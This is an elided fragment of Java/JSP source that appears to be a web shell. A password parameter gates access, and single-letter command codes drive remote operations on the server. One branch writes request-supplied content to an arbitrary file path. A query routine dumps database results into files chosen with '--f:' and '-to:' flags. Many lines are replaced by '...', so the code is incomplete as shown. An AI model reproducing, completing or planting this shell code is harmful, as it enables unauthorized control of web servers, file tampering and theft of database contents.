	...
	void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception {
		...
		try {
			...
			if(q.indexOf("--f:")!=-1){
				...
				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:") + 4,q.length
()).trim()),true),cs));
			}
			while (r.next()) {
				for (int i = 1; i <= n; i++) {
...
if (request.getParameter(Pwd) != null) {
	...
	try {
		...
		if (isEmpty(myAbsolutePath)) {//for weblogic
		...
		SHELL_DIR = convertPath(myAbsolutePath.substring(0,myAbsolutePath.lastIndexOf(File.separator)));
		//----------------------------
		String s = SHELL_DIR;//request.getSession().getServletContext().getRealPath("/");
		if (Z.equals("A")) {
			sb.append(s + "\t");
			...
			BufferedWriter bw1 = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
			bw1.write(z2);
			bw1.close();
			sb.append("1");
		} else if (Z.equals("E")) {
